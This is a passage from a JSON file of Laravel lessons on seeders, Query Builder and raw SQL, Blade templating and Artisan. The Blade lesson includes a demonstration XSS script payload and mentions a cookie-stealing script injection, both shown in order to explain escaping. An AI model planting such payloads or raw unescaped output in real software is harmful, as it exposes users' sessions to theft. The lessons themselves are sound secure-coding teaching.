key\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e$table-&gt;string(&#39;name&#39;)\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eVARCHAR(255)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e$table-&gt;timestamps()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecreated_at\u003c/code\u003e and \u003ccode\u003eupdated_at\u003c/code\u003e columns\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Laravel stamps every migration filename with a date-time prefix. This timestamp controls the run order. You never need to sort them manually.","text":"Laravel stamps every migration filename with a date-time prefix. This timestamp controls the run order. You never need to sort them manually."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Running \u003ccode\u003ephp artisan migrate:refresh --seed\u003c/code\u003e drops every table and re-runs all migrations from scratch. Any production data is permanently deleted. Use this command only in development, never against a live database.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Seeding: populating tables with sample data","text":"Seeding: populating tables with sample data"},{"kind":"p","html":"A seeder is a separate class whose \u003ccode\u003erun()\u003c/code\u003e method inserts rows. Create one with:","text":"A seeder is a separate class whose `run()` method inserts rows. Create one with:"},{"kind":"code","lang":"bash","code":"php artisan make:seeder StudentSeeder"},{"kind":"p","html":"This creates \u003ccode\u003edatabase/seeders/StudentSeeder.php\u003c/code\u003e. Add your insert logic inside \u003ccode\u003erun()\u003c/code\u003e:","text":"This creates `database/seeders/StudentSeeder.php`. Add your insert logic inside `run()`:"},{"kind":"code","lang":"php","code":"public function run(): void\n{\n    $s1 = new \\App\\Models\\Student([\n        'FirstName' =\u003e 'Tom',\n        'LastName'  =\u003e 'Max',\n        'School'    =\u003e 'Nursing'\n    ]);\n    $s1-\u003esave();\n}"},{"kind":"p","html":"Then register your seeder in \u003ccode\u003edatabase/seeders/DatabaseSeeder.php\u003c/code\u003e:","text":"Then register your seeder in `database/seeders/DatabaseSeeder.php`:"},{"kind":"code","lang":"php","code":"public function run(): void\n{\n    $this-\u003ecall(StudentSeeder::class);\n}"},{"kind":"p","html":"Finally, refresh and seed in one step:","text":"Finally, refresh and seed in one step:"},{"kind":"code","lang":"bash","code":"php artisan migrate:refresh --seed"},{"kind":"p","html":"The output shows each migration rolling back, then re-running, then your seeder firing.","text":"The output shows each migration rolling back, then re-running, then your seeder firing."},{"kind":"checkpoint","q":"Where do you register a custom seeder so that `php artisan migrate:refresh --seed` runs it?","a":"Add `$this-\u003ecall(StudentSeeder::class);` inside the `run()` method of `database/seeders/DatabaseSeeder.php`."},{"kind":"h2","html":"Factory seeders: generating random data","text":"Factory seeders: generating random data"},{"kind":"p","html":"When you need many rows quickly, use a factory instead of hand-writing each record. Create one with:","text":"When you need many rows quickly, use a factory instead of hand-writing each record. Create one with:"},{"kind":"code","lang":"bash","code":"php artisan make:factory StudentFactory"},{"kind":"p","html":"Update its \u003ccode\u003edefinition()\u003c/code\u003e method to use Faker:","text":"Update its `definition()` method to use Faker:"},{"kind":"code","lang":"php","code":"public function definition(): array\n{\n    return [\n        'FirstName' =\u003e $this-\u003efaker-\u003efirstName(),\n        'LastName'  =\u003e $this-\u003efaker-\u003elastName(),\n        'School'    =\u003e $this-\u003efaker-\u003ecompany(),\n    ];\n}"},{"kind":"p","html":"In \u003ccode\u003eDatabaseSeeder.php\u003c/code\u003e, call the factory to generate 20 rows:","text":"In `DatabaseSeeder.php`, call the factory to generate 20 rows:"},{"kind":"code","lang":"php","code":"\\App\\Models\\Student::factory(20)-\u003ecreate();"},{"kind":"p","html":"For this to work, your model must use the \u003ccode\u003eHasFactory\u003c/code\u003e trait:","text":"For this to work, your model must use the `HasFactory` trait:"},{"kind":"code","lang":"php","code":"use Illuminate\\Database\\Eloquent\\Factories\\HasFactory;\n\nclass Student extends Model\n{\n    use HasFactory;\n    protected $fillable = ['FirstName', 'LastName', 'School'];\n}"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Factories rely on \u003ccode\u003e$fillable\u003c/code\u003e. If you forget the \u003ccode\u003e$fillable\u003c/code\u003e array on your model, \u003ccode\u003ecreate()\u003c/code\u003e throws a mass assignment exception and no rows are inserted.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e \u003ccode\u003ephp artisan migrate:refresh --seed\u003c/code\u003e drops all tables and wipes all data. Use it freely in development; never run it against a production database. \u003ccode\u003emigrate:fresh\u003c/code\u003e has the same destructive behavior.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Migrations give you version control for your database schema — every change is a tracked, reversible PHP class. Seeders pair with \u003ccode\u003emigrate:refresh --seed\u003c/code\u003e to rebuild a clean, populated database in one command. The \u003ccode\u003e-m\u003c/code\u003e flag creates both the model and its migration together, which is the fastest way to start a new table.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":4,"id":"query-builder-and-raw-sql","title":"Query Builder and raw SQL — when Eloquent is too much","hook":"Learn how DB::table() gives you precise control without writing raw SQL strings.","tags":["laravel","query-builder","raw-sql","database"],"module":"Laravel Database","source":"TIDBITS-components_config_db_SCRIPT.docx","blocks":[{"kind":"h2","html":"A concrete example: three ways to do the same thing","text":"A concrete example: three ways to do the same thing"},{"kind":"p","html":"You need all students who have a school assigned, sorted by first name, selecting three columns. Here are all three patterns in Laravel&#39;s recommended order:","text":"You need all students who have a school assigned, sorted by first name, selecting three columns. Here are all three patterns in Laravel's recommended order:"},{"kind":"code","lang":"php","code":"// 1. Eloquent ORM — preferred\n$students = Student::select(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003eorderBy('FirstName')\n    -\u003eget();\n\n// 2. Query Builder — second choice\n$students = DB::table('students')\n    -\u003eselect(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003eorderBy('FirstName')\n    -\u003eget();\n\n// 3. Raw SQL — least preferred\n$students = DB::select('SELECT * FROM students');"},{"kind":"p","html":"Eloquent returns typed model instances. Query Builder returns plain \u003ccode\u003estdClass\u003c/code\u003e objects. Raw SQL also returns \u003ccode\u003estdClass\u003c/code\u003e objects but gives you no fluent methods — just a string you write and maintain yourself.","text":"Eloquent returns typed model instances. Query Builder returns plain `stdClass` objects. Raw SQL also returns `stdClass` objects but gives you no fluent methods — just a string you write and maintain yourself."},{"kind":"h2","html":"What is Query Builder?","text":"What is Query Builder?"},{"kind":"p","html":"Query Builder sits between Eloquent and raw SQL. You call \u003ccode\u003eDB::table(&#39;table_name&#39;)\u003c/code\u003e and chain methods — \u003ccode\u003e-&gt;select()\u003c/code\u003e, \u003ccode\u003e-&gt;where()\u003c/code\u003e, \u003ccode\u003e-&gt;whereNotNull()\u003c/code\u003e, \u003ccode\u003e-&gt;orderBy()\u003c/code\u003e, \u003ccode\u003e-&gt;get()\u003c/code\u003e. Each method adds one clause to the query. You never write SQL text.","text":"Query Builder sits between Eloquent and raw SQL. You call `DB::table('table_name')` and chain methods — `-\u003eselect()`, `-\u003ewhere()`, `-\u003ewhereNotNull()`, `-\u003eorderBy()`, `-\u003eget()`. Each method adds one clause to the query. You never write SQL text."},{"kind":"code","lang":"php","code":"use Illuminate\\Support\\Facades\\DB;\n\n$students = DB::table('students')\n    -\u003eselect(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003eorderBy('FirstName')\n    -\u003eget();"},{"kind":"p","html":"You need the \u003ccode\u003eDB\u003c/code\u003e facade (\u003ccode\u003euse Illuminate\\Support\\Facades\\DB\u003c/code\u003e) before calling \u003ccode\u003eDB::table()\u003c/code\u003e. Without the import, PHP throws a class-not-found error.","text":"You need the `DB` facade (`use Illuminate\\Support\\Facades\\DB`) before calling `DB::table()`. Without the import, PHP throws a class-not-found error."},{"kind":"checkpoint","q":"The code above chains `-\u003ewhereNotNull('School')`. What does that clause do to the SQL query produced?","a":"It adds `WHERE School IS NOT NULL`, filtering out rows where the School column is NULL."},{"kind":"h2","html":"What is raw SQL?","text":"What is raw SQL?"},{"kind":"p","html":"Raw SQL uses \u003ccode\u003eDB::select()\u003c/code\u003e with a plain SQL string. The call below fetches all rows from the \u003ccode\u003estudents\u003c/code\u003e table:","text":"Raw SQL uses `DB::select()` with a plain SQL string. The call below fetches all rows from the `students` table:"},{"kind":"code","lang":"php","code":"$students = DB::select('SELECT * FROM students');"},{"kind":"p","html":"You get back an array of \u003ccode\u003estdClass\u003c/code\u003e objects. You can pass parameters to avoid SQL injection:","text":"You get back an array of `stdClass` objects. You can pass parameters to avoid SQL injection:"},{"kind":"code","lang":"php","code":"$students = DB::select('SELECT * FROM students WHERE School = ?', ['Mining']);"},{"kind":"p","html":"The \u003ccode\u003e?\u003c/code\u003e placeholder is replaced safely by Laravel&#39;s PDO binding — never concatenate user input into the SQL string directly.","text":"The `?` placeholder is replaced safely by Laravel's PDO binding — never concatenate user input into the SQL string directly."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eRaw SQL bypasses every Query Builder helper. You write column names as strings — a typo becomes a runtime error, not a compile-time error. You also lose Laravel&#39;s automatic parameter quoting when you concatenate variables. Use \u003ccode\u003eDB::select()\u003c/code\u003e only when you need a SQL feature that Query Builder cannot express (e.g., complex subqueries, database-specific functions). For standard CRUD, Query Builder handles it.\u003c/p\u003e","text":"Raw SQL bypasses every Query Builder helper. You write column names as strings — a typo becomes a runtime error, not a compile-time error. You also lose Laravel's automatic parameter quoting when you concatenate variables. Use `DB::select()` only when you need a SQL feature that Query Builder cannot express (e.g., complex subqueries, database-specific functions). For standard CRUD, Query Builder handles it."},{"kind":"h2","html":"When to use each pattern","text":"When to use each pattern"},{"kind":"p","html":"The standard hierarchy in Laravel codebases is explicit: Eloquent first, Query Builder second, raw SQL only when needed.","text":"The standard hierarchy in Laravel codebases is explicit: Eloquent first, Query Builder second, raw SQL only when needed."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePattern\u003c/th\u003e\n\u003cth\u003eUse when\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eEloquent ORM\u003c/td\u003e\n\u003ctd\u003eYou have a model and want typed return objects, relationships, or mass-assignment protection.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eQuery Builder\u003c/td\u003e\n\u003ctd\u003eNo model available, or the query is complex enough that Eloquent&#39;s API is awkward.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRaw SQL\u003c/td\u003e\n\u003ctd\u003eYou need SQL syntax that Query Builder cannot produce.\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"checkpoint","q":"You are writing a controller action that selects `FirstName`, `LastName`, `School` from `students`, filters out null schools, and sorts by `FirstName`. You do not need model instances. Which pattern does Laravel convention recommend for this situation, and why?","a":"Query Builder — `DB::table('students')-\u003eselect([...])-\u003ewhereNotNull('School')-\u003eorderBy('FirstName')-\u003eget()`. Eloquent would also be acceptable, but if there is no need for a typed model, Query Builder is the second-choice pattern explicitly demonstrated in the source material."},{"kind":"h2","html":"Inspecting the actual SQL","text":"Inspecting the actual SQL"},{"kind":"p","html":"When debugging a Query Builder or Eloquent chain, you can log the generated SQL:","text":"When debugging a Query Builder or Eloquent chain, you can log the generated SQL:"},{"kind":"code","lang":"php","code":"DB::enableQueryLog();\n\n$students = DB::table('students')\n    -\u003eselect(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003eorderBy('FirstName')\n    -\u003eget();\n\nprint_r(DB::getQueryLog());"},{"kind":"p","html":"\u003ccode\u003eDB::enableQueryLog()\u003c/code\u003e starts recording. \u003ccode\u003eDB::getQueryLog()\u003c/code\u003e returns an array of the SQL strings and bindings. This is your debug tool when a query returns unexpected results.","text":"`DB::enableQueryLog()` starts recording. `DB::getQueryLog()` returns an array of the SQL strings and bindings. This is your debug tool when a query returns unexpected results."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eQuery Builder is the middle layer in Laravel&#39;s three-tier data-access stack: more flexible than Eloquent when you have no model, far safer and more readable than raw SQL strings. Always reach for Eloquent first, then Query Builder, then \u003ccode\u003eDB::select()\u003c/code\u003e only when the first two cannot express your query. Call \u003ccode\u003e-&gt;get()\u003c/code\u003e at the end of every chain — omitting it returns a query object, not results.\u003c/p\u003e","text":"Query Builder is the middle layer in Laravel's three-tier data-access stack: more flexible than Eloquent when you have no model, far safer and more readable than raw SQL strings. Always reach for Eloquent first, then Query Builder, then `DB::select()` only when the first two cannot express your query. Call `-\u003eget()` at the end of every chain — omitting it returns a query object, not results."}]},{"n":5,"id":"laravel-mvc-blade","title":"MVC architecture and Blade templating","hook":"See how Laravel splits your app into three clean layers — then write the template syntax that holds the view layer together.","tags":["laravel","mvc","blade","views","templating","xss"],"module":"Laravel Foundations","source":"intro_to_laravel.pptx; intro_to_laravel_SCRIPT.docx","blocks":[{"kind":"h2","html":"What you are already looking at","text":"What you are already looking at"},{"kind":"p","html":"Open any Laravel project and go to \u003ccode\u003eresources/views/welcome.blade.php\u003c/code\u003e. You will find something like this:","text":"Open any Laravel project and go to `resources/views/welcome.blade.php`. You will find something like this:"},{"kind":"code","lang":"blade","code":"@extends('layouts.master')\n\n@section('content')\n\u003cspan style=\"background:tomato; font-size:xx-large;\"\u003e\n    Helloooooo Laraveeeeel\n\u003c/span\u003e\n@endsection"},{"kind":"p","html":"That file is a Blade template. It does not contain raw PHP. It uses @-directives (\u003ccode\u003e@extends\u003c/code\u003e, \u003ccode\u003e@section\u003c/code\u003e, \u003ccode\u003e@endsection\u003c/code\u003e) to plug content into a parent layout. You will understand exactly how this works by the end of this lesson.","text":"That file is a Blade template. It does not contain raw PHP. It uses @-directives (`@extends`, `@section`, `@endsection`) to plug content into a parent layout. You will understand exactly how this works by the end of this lesson."},{"kind":"checkpoint","q":"Before reading further — where do you think `@extends('layouts.master')` looks for the parent file?","a":"It loads `resources/views/layouts/master.blade.php`. Laravel maps dot-notation paths to the `resources/views/` directory tree."},{"kind":"h2","html":"The three-layer split: MVC","text":"The three-layer split: MVC"},{"kind":"p","html":"Laravel enforces a directory layout that separates your application into three roles. (Source: intro_to_laravel.pptx slides 3–5)","text":"Laravel enforces a directory layout that separates your application into three roles. (Source: intro_to_laravel.pptx slides 3–5)"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eLayer\u003c/th\u003e\n\u003cth\u003eDirectory\u003c/th\u003e\n\u003cth\u003eResponsibility\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eModel\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eapp/Models/\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eData and business rules\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eView\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eresources/views/\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eWhat the user sees\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eController\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eapp/Http/Controllers/\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAccepts requests, calls the model, returns a view\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Laravel is opinionated: if you put code in the wrong directory, the framework will not find it. Each layer has one job.","text":"Laravel is opinionated: if you put code in the wrong directory, the framework will not find it. Each layer has one job."},{"kind":"mermaid","source":"graph LR\n    Browser --\u003e|HTTP request| C[Controller]\n    C --\u003e|query| M[Model]\n    M --\u003e|data| C\n    C --\u003e|data + view name| V[View / Blade]\n    V --\u003e|HTML response| Browser"},{"kind":"checkpoint","q":"A controller calls `view('home', ['user' =\u003e $user])`. Which layer renders the HTML?","a":"The View layer — Blade compiles `resources/views/home.blade.php` with `$user` available as a template variable."},{"kind":"h2","html":"Layout inheritance: @extends, @section, @yield, @endsection","text":"Layout inheritance: @extends, @section, @yield, @endsection"},{"kind":"p","html":"Blade&#39;s layout system lets many pages share one HTML skeleton. (Source: intro_to_laravel.pptx slides 16–19; intro_to_laravel_SCRIPT.docx §Creating your own blade template)","text":"Blade's layout system lets many pages share one HTML skeleton. (Source: intro_to_laravel.pptx slides 16–19; intro_to_laravel_SCRIPT.docx §Creating your own blade template)"},{"kind":"p","html":"\u003cstrong\u003eParent layout\u003c/strong\u003e (\u003ccode\u003eresources/views/layouts/master.blade.php\u003c/code\u003e):","text":"**Parent layout** (`resources/views/layouts/master.blade.php`):"},{"kind":"code","lang":"blade","code":"\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"{{ str_replace('_', '-', app()-\u003egetLocale()) }}\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003ctitle\u003eLaravel\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    @yield('content')\n\u003c/body\u003e\n\u003c/html\u003e"},{"kind":"p","html":"\u003ccode\u003e@yield(&#39;content&#39;)\u003c/code\u003e marks the injection point. Any child template that \u003ccode\u003e@extends\u003c/code\u003e this layout will fill that slot.","text":"`@yield('content')` marks the injection point. Any child template that `@extends` this layout will fill that slot."},{"kind":"p","html":"\u003cstrong\u003eChild template\u003c/strong\u003e (\u003ccode\u003eresources/views/welcome.blade.php\u003c/code\u003e):","text":"**Child template** (`resources/views/welcome.blade.php`):"},{"kind":"code","lang":"blade","code":"@extends('layouts.master')\n\n@section('content')\n    \u003ch1\u003eHello from the child view\u003c/h1\u003e\n@endsection"},{"kind":"p","html":"When Laravel renders this, it compiles the parent layout with the child&#39;s \u003ccode\u003econtent\u003c/code\u003e section injected at \u003ccode\u003e@yield(&#39;content&#39;)\u003c/code\u003e. Notice there is no \u003ccode\u003e&lt;?php ... ?&gt;\u003c/code\u003e anywhere.","text":"When Laravel renders this, it compiles the parent layout with the child's `content` section injected at `@yield('content')`. Notice there is no `\u003c?php ... ?\u003e` anywhere."},{"kind":"h2","html":"Partial views and @include","text":"Partial views and @include"},{"kind":"p","html":"Partial views are reusable Blade fragments. You include them with \u003ccode\u003e@include\u003c/code\u003e. (Source: intro_to_laravel.pptx slide 20; intro_to_laravel_SCRIPT.docx §Partial views)","text":"Partial views are reusable Blade fragments. You include them with `@include`. (Source: intro_to_laravel.pptx slide 20; intro_to_laravel_SCRIPT.docx §Partial views)"},{"kind":"p","html":"Create \u003ccode\u003eresources/views/partials/header.blade.php\u003c/code\u003e:","text":"Create `resources/views/partials/header.blade.php`:"},{"kind":"code","lang":"blade","code":"\u003cnav class=\"navbar navbar-light bg-light\"\u003e\n    \u003ca href=\"#\" class=\"navbar-brand\"\u003eMy App\u003c/a\u003e\n\u003c/nav\u003e"},{"kind":"p","html":"Include it inside the layout:","text":"Include it inside the layout:"},{"kind":"code","lang":"blade","code":"\u003cbody\u003e\n    @include('partials.header')\n    @yield('content')\n\u003c/body\u003e"},{"kind":"p","html":"The term for this pattern is \u003cstrong\u003epartial view\u003c/strong\u003e — a reusable Blade template fragment. Use dot-notation to reference the path: \u003ccode\u003epartials.header\u003c/code\u003e maps to \u003ccode\u003eresources/views/partials/header.blade.php\u003c/code\u003e.","text":"The term for this pattern is **partial view** — a reusable Blade template fragment. Use dot-notation to reference the path: `partials.header` maps to `resources/views/partials/header.blade.php`."},{"kind":"h2","html":"Double-brace syntax and XSS protection","text":"Double-brace syntax and XSS protection"},{"kind":"p","html":"Blade gives you two output syntaxes. They are not interchangeable. (Source: intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection)","text":"Blade gives you two output syntaxes. They are not interchangeable. (Source: intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection)"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eSyntax\u003c/th\u003e\n\u003cth\u003eWhat it does\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e{{ $var }}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eEscapes HTML entities — XSS-safe\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e{!! $var !!}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eOutputs raw HTML — XSS risk\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"code","lang":"blade","code":"{{-- These both try to inject a script tag --}}\n\u003cp\u003e{{ \"\u003cscript\u003ealert('hello');\u003c/script\u003e\" }}\u003c/p\u003e\n{{-- Output: &lt;script&gt;alert(&#039;hello&#039;);&lt;/script&gt; — harmless text --}}\n\n\u003cp\u003e{!! \"\u003cscript\u003ealert('hello');\u003c/script\u003e\" !!}\u003c/p\u003e\n{{-- Output: the script tag executes in the browser --}}"},{"kind":"p","html":"The \u003cstrong\u003edouble-brace syntax\u003c/strong\u003e (\u003ccode\u003e{{ }}\u003c/code\u003e) is the default. It escapes every value before rendering. Use \u003ccode\u003e{!! !!}\u003c/code\u003e only when you have already sanitized the input server-side and intentionally need raw HTML.","text":"The **double-brace syntax** (`{{ }}`) is the default. It escapes every value before rendering. Use `{!! !!}` only when you have already sanitized the input server-side and intentionally need raw HTML."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Using \u003ccode\u003e{!! $userInput !!}\u003c/code\u003e with unsanitized user data is an \u003cstrong\u003eXSS\u003c/strong\u003e vulnerability. An attacker can inject \u003ccode\u003e&lt;script&gt;document.cookie = &#39;...&#39;&lt;/script&gt;\u003c/code\u003e and steal session tokens. Always use \u003ccode\u003e{{ }}\u003c/code\u003e for user-supplied values. (Source: intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection)\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Control flow: @if and @foreach","text":"Control flow: @if and @foreach"},{"kind":"p","html":"Blade wraps PHP control structures in @-directives. (Source: intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures)","text":"Blade wraps PHP control structures in @-directives. (Source: intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures)"},{"kind":"code","lang":"blade","code":"\u003cul\u003e\n    @foreach($posts as $item)\n        \u003cli\u003e{{ $item }}\u003c/li\u003e\n    @endforeach\n\u003c/ul\u003e\n\n@if($id == 5)\n    \u003cp\u003eSecret!\u003c/p\u003e\n@endif"},{"kind":"p","html":"Every opening directive has a matching closing directive: \u003ccode\u003e@foreach\u003c/code\u003e / \u003ccode\u003e@endforeach\u003c/code\u003e, \u003ccode\u003e@if\u003c/code\u003e / \u003ccode\u003e@endif\u003c/code\u003e, \u003ccode\u003e@for\u003c/code\u003e / \u003ccode\u003e@endfor\u003c/code\u003e, \u003ccode\u003e@section\u003c/code\u003e / \u003ccode\u003e@endsection\u003c/code\u003e. The closing directive is mandatory — leaving it out is the most common beginner error.","text":"Every opening directive has a matching closing directive: `@foreach` / `@endforeach`, `@if` / `@endif`, `@for` / `@endfor`, `@section` / `@endsection`. The closing directive is mandatory — leaving it out is the most common beginner error."},{"kind":"checkpoint","q":"You write `@foreach($users as $u)` but forget `@endforeach`. What happens?","a":"Blade fails to compile the template and throws a parse error. Every opening @-directive requires its closing counterpart."},{"kind":"h2","html":"Blade components: the x-component syntax","text":"Blade components: the x-component syntax"},{"kind":"p","html":"Blade components are a newer alternative to the \u003ccode\u003e@extends\u003c/code\u003e / \u003ccode\u003e@section\u003c/code\u003e pattern. (Source: TIDBITS-components_config_db_SCRIPT.docx §Blade Components)","text":"Blade components are a newer alternative to the `@extends` / `@section` pattern. (Source: TIDBITS-components_config_db_SCRIPT.docx §Blade Components)"},{"kind":"p","html":"Create \u003ccode\u003eresources/views/components/master.blade.php\u003c/code\u003e with \u003ccode\u003e{{ $content }}\u003c/code\u003e as the slot placeholder (instead of \u003ccode\u003e@yield\u003c/code\u003e).","text":"Create `resources/views/components/master.blade.php` with `{{ $content }}` as the slot placeholder (instead of `@yield`)."},{"kind":"p","html":"In your view, use:","text":"In your view, use:"},{"kind":"code","lang":"blade","code":"\u003cx-master\u003e\n    \u003cx-slot name=\"content\"\u003e\n        \u003ch1\u003eHello from a Blade component\u003c/h1\u003e\n    \u003c/x-slot\u003e\n\u003c/x-master\u003e"},{"kind":"p","html":"The component name \u003ccode\u003ex-master\u003c/code\u003e maps to \u003ccode\u003eresources/views/components/master.blade.php\u003c/code\u003e. Named slots use \u003ccode\u003e&lt;x-slot name=&quot;...&quot;&gt;\u003c/code\u003e. The component receives each slot as a \u003ccode\u003e$slotName\u003c/code\u003e variable.","text":"The component name `x-master` maps to `resources/views/components/master.blade.php`. Named slots use `\u003cx-slot name=\"...\"\u003e`. The component receives each slot as a `$slotName` variable."},{"kind":"h2","html":"Facades in Blade: URL::","text":"Facades in Blade: URL::"},{"kind":"p","html":"A \u003cstrong\u003efacade\u003c/strong\u003e gives you a static-like interface to a Laravel service. In Blade, you use them directly inside \u003ccode\u003e{{ }}\u003c/code\u003e. (Source: intro_to_laravel.pptx slides 27–28)","text":"A **facade** gives you a static-like interface to a Laravel service. In Blade, you use them directly inside `{{ }}`. (Source: intro_to_laravel.pptx slides 27–28)"},{"kind":"code","lang":"blade","code":"\u003clink rel=\"stylesheet\" href=\"{{ URL::to('css/styles.css') }}\" /\u003e"},{"kind":"p","html":"\u003ccode\u003eURL::to()\u003c/code\u003e generates an absolute URL to a public asset. Using absolute paths prevents broken assets when your app runs in a subdirectory.","text":"`URL::to()` generates an absolute URL to a public asset. Using absolute paths prevents broken assets when your app runs in a subdirectory."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e A missing \u003ccode\u003e@endforeach\u003c/code\u003e (or any unclosed \u003ccode\u003e@\u003c/code\u003e-directive) causes Blade to throw a parse error — the template never renders. Laravel does not silently skip unclosed directives. This was a direct exam question.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Blade keeps your views clean by replacing raw PHP with @-directives and the double-brace syntax. The MVC split means your controller never writes HTML directly, and your view never queries the database directly. Always use \u003ccode\u003e{{ }}\u003c/code\u003e for output — switch to \u003ccode\u003e{!! !!}\u003c/code\u003e only when you own the content and have sanitized it. Forgetting a closing @-directive and reaching for \u003ccode\u003e{!! !!}\u003c/code\u003e on user input are the two most common traps.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":6,"id":"artisan-composer","title":"Artisan CLI and Composer — your Laravel toolkit","hook":"Two tools you run before writing a single line of application code.","tags":["artisan","composer","cli","laravel","project-setup"],"module":"Laravel Foundations","source":"intro_to_laravel.pptx; intro_to_laravel_SCRIPT.docx","blocks":[{"kind":"h2","html":"From zero to running app in two commands","text":"From zero to running app in two commands"},{"kind":"p","html":"Before you write a controller or a view, you run this:","text":"Before you write a controller or a view, you run this:"},{"kind":"code","lang":"bash","code":"composer create-project laravel/laravel my-app\ncd my-app\nphp artisan serve --port=8888"},{"kind":"p","html":"Those three lines create a complete Laravel project and start the dev server at \u003ccode\u003ehttp://localhost:8888\u003c/code\u003e. Composer builds the project; Artisan runs it. Everything else you do in Laravel flows from these two tools.","text":"Those three lines create a complete Laravel project and start the dev server at `http://localhost:8888`. Composer builds the project; Artisan runs it. Everything else you do in Laravel flows from these two tools."},{"kind":"h2","html":"What Composer does","text":"What Composer does"},{"kind":"p","html":"Composer is PHP&#39;s dependency manager. You use it to create a project and to add packages later.","text":"Composer is PHP's dependency manager. You use it to create a project and to add packages later."},{"kind":"code","lang":"bash","code":"# Create a new Laravel project\ncomposer create-project laravel/laravel project-name\n\n# Add a package to an existing project\ncomposer require vendor/package-name"},{"kind":"p","html":"After \u003ccode\u003ecreate-project\u003c/code\u003e, Composer downloads Laravel and all its dependencies into the \u003ccode\u003evendor/\u003c/code\u003e folder. That folder is git-ignored — anyone cloning your repo restores it with \u003ccode\u003ecomposer install\u003c/code\u003e.","text":"After `create-project`, Composer downloads Laravel and all its dependencies into the `vendor/` folder. That folder is git-ignored — anyone cloning your repo restores it with `composer install`."},{"kind":"checkpoint","q":"A teammate cloned your repo. The `vendor/` folder is missing. What command restores it?","a":"`composer install` — it reads `composer.json` and downloads everything listed there."},{"kind":"h2","html":"What Artisan does","text":"What Artisan does"},{"kind":"p","html":"Artisan is Laravel&#39;s built-in CLI. You run every Artisan command with the \u003ccode\u003ephp artisan\u003c/code\u003e prefix.","text":"Artisan is Laravel's built-in CLI. You run every Artisan command with the `php artisan` 